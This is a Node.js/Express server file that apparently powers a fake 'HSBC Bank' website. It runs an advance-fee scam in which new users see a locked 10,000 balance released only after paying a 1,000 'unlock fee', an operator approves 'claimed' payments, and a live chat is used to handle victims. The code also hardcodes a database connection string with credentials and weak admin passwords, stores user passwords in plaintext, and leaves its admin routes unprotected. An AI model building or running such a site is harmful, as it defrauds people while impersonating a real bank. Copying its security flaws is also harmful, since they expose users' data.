const express = require('express');
const mongoose = require('mongoose'); // Cloud Database Driver
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// --- CLOUD DATABASE CONNECTION ---
const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://hsbc:88888888Aa@cluster0.zsj4kdb.mongodb.net/test?retryWrites=true&w=majority";
mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ Connected to Secure Bank Vault (MongoDB)"))
    .catch(err => console.error("❌ MongoDB Connection Error:", err));

// --- DATA MODELS (The Vault Folders) ---
const userSchema = new mongoose.Schema({
    username: { type: String, unique: true, required: true },
    password: { type: String, required: true },
    name: String,
    walletStatus: { type: String, default: "LOCKED" },
    pendingBalance: { type: Number, default: 10000.00 }, // --- UPDATED TO 10K ---
    availableBalance: { type: Number, default: 0.00 },
    unlockFee: { type: Number, default: 1000.00 }, // --- UPDATED TO MATCH YOUR NEW UI ---
    notifiedAdmin: { type: Boolean, default: false }
});

const chatSchema = new mongoose.Schema({
    username: String,
    sender: String,
    text: String,
    timestamp: String
});

const User = mongoose.model('User', userSchema);
const Chat = mongoose.model('Chat', chatSchema);

// --- AUTHENTICATION ROUTES ---

app.post('/api/register', async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ success: false, error: "Fill all fields" });
    
    try {
        const existingUser = await User.findOne({ username });
        if (existingUser) return res.status(400).json({ success: false, error: "User already exists" });

        const newUser = new User({
            username: username,
            password: password,
            name: username,
            walletStatus: "LOCKED",
            pendingBalance: 10000.00, // --- UPDATED TO 10K ---
            availableBalance: 0.00,
            unlockFee: 1000.00, // --- UPDATED TO 1K ---
            notifiedAdmin: false
        });

        await newUser.save();
        console.log(`[REGISTRATION]: New user '${username}' created automatically in Cloud Vault.`);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: "Server Error" });
    }
});

app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;

    // --- MASTER ADMIN ACCOUNT CHECK ---
    const MASTER_ADMIN_USER = "admin"; 
    const MASTER_ADMIN_PASS = "boss123"; 

    if (username === MASTER_ADMIN_USER && password === MASTER_ADMIN_PASS) {
        return res.json({ 
            success: true, 
            isAdmin: true, 
            redirect: "/admin.html" 
        });
    }

    // --- REGULAR USER CHECK ---
    try {
        const user = await User.findOne({ username });
        if (user && user.password === password) {
            res.json({ 
                success: true, 
                username: username, 
                isAdmin: false, 
                redirect: "/index.html" 
            });
        } else {
            res.status(401).json({ success: false, error: "Invalid credentials" });
        }
    } catch (err) {
        res.status(500).json({ success: false, error: "Server Error" });
    }
});

// --- BANKING ROUTES ---

app.get('/wallet/:id', async (req, res) => {
    try {
        const user = await User.findOne({ username: req.params.id });
        if (!user) return res.status(404).json({ error: "User not found" });
        res.json(user);
    } catch (err) {
        res.status(500).json({ error: "Server Error" });
    }
});

app.post('/wallet/:id/request-unlock', async (req, res) => {
    try {
        const user = await User.findOne({ username: req.params.id });
        if (!user) return res.status(404).json({ error: "User not found" });

        user.walletStatus = "PENDING_APPROVAL";
        user.notifiedAdmin = true;
        await user.save();

        console.log(`\n************************************************`);
        console.log(`ALERT: User '${req.params.id}' claims to have paid!`);
        console.log(`Verify payment and approve at: https://hsbc-lcgy.onrender.com/admin/approve/${req.params.id}`);
        console.log(`************************************************\n`);

        res.json({ 
            success: true, 
            message: "Payment notification sent. Your funds will be released after admin verification." 
        });
    } catch (err) {
        res.status(500).json({ error: "Server Error" });
    }
});

// --- LIVE CHAT ROUTES ---

app.post('/api/chat/send', async (req, res) => {
    const { username, text, isAdmin } = req.body;
    if (!username || !text) return res.status(400).json({ error: "Missing data" });

    try {
        const newChat = new Chat({
            username: username,
            sender: isAdmin ? 'admin' : 'user',
            text: text,
            timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
        });
        await newChat.save();
        console.log(`[CHAT] ${isAdmin ? 'ADMIN' : username}: ${text}`);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Server Error" });
    }
});

app.get('/api/chat/history/:username', async (req, res) => {
    try {
        const history = await Chat.find({ username: req.params.username });
        res.json(history);
    } catch (err) {
        res.status(500).json({ error: "Server Error" });
    }
});

// --- ADMIN ROUTES ---

const ADMIN_PASSWORD = "boss";

app.post('/api/admin/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, error: "Unauthorized" });
    }
});

app.get('/api/admin/users/all', async (req, res) => {
    try {
        const allUsers = await User.find({});
        res.json(allUsers);
    } catch (err) {
        res.status(500).json({ error: "Server Error" });
    }
});

app.get('/admin/approve/:username', async (req, res) => {
    try {
        const user = await User.findOne({ username: req.params.username });
        if (!user) return res.status(404).send("User not found");

        user.walletStatus = "ACTIVE";
        user.availableBalance = user.pendingBalance;
        user.pendingBalance = 0;
        await user.save();

        console.log(`[ADMIN]: Funds released for ${req.params.username}`);
        res.send(`<h1>Approval Success</h1><p>User <b>${req.params.username}</b> now has access to their funds.</p>`);
    } catch (err) {
        res.status(500).send("Server Error");
    }
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`-------------------------------------------`);
    console.log(`HSBC Bank System Running (Cloud Persistence)`);
    console.log(`Admin Data: https://hsbc-lcgy.onrender.com/admin.html`);
    console.log(`Cloud Vault Status: Connecting...`);
    console.log(`-------------------------------------------`);
});